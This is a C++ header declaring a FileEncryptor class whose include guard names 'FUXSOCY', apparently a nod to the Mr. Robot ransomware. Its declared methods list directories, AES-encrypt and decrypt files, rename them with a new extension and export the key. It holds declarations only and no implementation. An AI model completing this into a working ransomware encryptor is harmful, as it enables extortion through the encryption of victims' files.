#ifndef FUXSOCY_FILE_ENCRYPTOR_H_
#define FUXSOCY_FILE_ENCRYPTOR_H_

extern "C" {
#include <dirent.h>
#include <fcntl.h>
}
#include <vector>
#include <string>

#include <cryptopp/aes.h>

class FileEncryptor {
 public:
  FileEncryptor();
  FileEncryptor(const std::string& b64_iv, const std::string& b64_key);
  virtual ~FileEncryptor() = default;

  std::vector<std::string> ListDirectory(std::string directory) const;
  void Encrypt(const std::string& filename) const;
  void Decrypt(const std::string& filename) const;
  std::string Export() const; // export iv and key

 private:  
  static std::string GetOriginalFilename(std::string filename);
  static bool FilenameEndsIn(const std::string& filename, const std::string& keyword);

  static const std::string kNewExtension;
  CryptoPP::byte iv_[CryptoPP::AES::DEFAULT_BLOCKSIZE];
  CryptoPP::byte key_[CryptoPP::AES::DEFAULT_KEYLENGTH];
};

#endif // FUXSOCY_FILE_ENCRYPTOR_H_
